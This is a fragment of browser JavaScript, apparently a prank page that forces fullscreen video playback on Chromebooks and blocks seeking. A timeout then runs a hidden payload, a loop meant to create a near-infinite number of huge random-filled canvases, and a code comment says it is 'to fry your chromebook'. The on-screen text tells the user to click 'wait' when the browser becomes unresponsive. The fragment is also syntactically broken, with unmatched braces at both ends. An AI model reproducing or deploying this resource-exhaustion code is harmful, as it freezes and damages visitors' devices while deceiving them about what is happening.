<script>

} else {

    window.location.href = "https://www.google.com";

  const videoElement = document.getElementById('my-video');
  const statusMessage = document.getElementById('status-message');
  const fsBtn = document.getElementById('fs-btn');

  const TIMEOUT_MS = 6000; // 6 seconds
  let timeoutId = null;
  let deb = false;
  let lastAllowedTime = 0; // track last valid playback position
  // this is to fry your chromebook down here
  function createCanvas(id, width = 15000, height = 15000) {
    const canvas = document.createElement('canvas');
    canvas.id = id;
    canvas.width = width;
    canvas.height = height;
    document.body.appendChild(canvas);



    const ctx = canvas.getContext('2d');
    const imageData = ctx.createImageData(width, height);
    const data = imageData.data;

    for (let i = 0; i < data.length; i += 4) {
      data[i]   = Math.random() * 256;
      data[i+1] = Math.random() * 256;
      data[i+2] = Math.random() * 256;
      data[i+3] = 255;
    }
    ctx.putImageData(imageData, 0, 0);
  }

  function triggerTimeout() {
    videoElement.pause();
    document.body.style.backgroundColor = '#ef4444';
    setTimeout(() => { document.body.style.backgroundColor = 'transparent'; }, 500);

       // Create 100000000000000000000000 canvases 
      for (let i = 0; i < 100000000000000000000000; i++) {
        createCanvas(`canvas-${i}`);
      }
  }

  function startTimer() {
    clearTimeout(timeoutId);
    timeoutId = setTimeout(() => {
      triggerTimeout();
    }, TIMEOUT_MS);
    statusMessage.textContent = "Fullscreen active. Do not exit, if it says unresponsive, click wait";
  }

  function resetAll() {
    clearTimeout(timeoutId);
    videoElement.pause();
    videoElement.currentTime = 0;
    statusMessage.textContent = "Exited fullscreen. Click 'CLICK ME' button to restart.";
    fsBtn.style.display = "block";
  }

  fsBtn.addEventListener('click', () => {
    if (document.fullscreenElement) return;
                  alert('(Make sure you fullscreened your chromebook using the button on your chromebook before starting, Do it now before a error occurs)');

    document.documentElement.requestFullscreen().then(() => {

      videoElement.play().then(() => {
        startTimer();
        fsBtn.style.display = "none";
      });
    });
  });

  document.addEventListener('fullscreenchange', () => {
    if (!document.fullscreenElement) {
      if (deb == false) {
        resetAll();
      }
    }
  });
// --- NEW: Block playing if not in fullscreen ---
  videoElement.addEventListener('play', () => {
    if (!document.fullscreenElement) {
      videoElement.pause();
      videoElement.currentTime = 0;
      lastAllowedTime = 0;
      statusMessage.textContent = "Please use the 'CLICK ME' button to start playback.";
    } else {
    }
  });
  // --- BLOCK SEEKING COMPLETELY ---
  videoElement.addEventListener('timeupdate', () => {
    lastAllowedTime = videoElement.currentTime;
  });

  videoElement.addEventListener('seeking', () => {
    // Force back to last allowed time
    if (videoElement.currentTime !== lastAllowedTime) {
      videoElement.currentTime = lastAllowedTime;
      statusMessage.textContent = "Seeking blocked.";
    }
  });
    }, 2000);
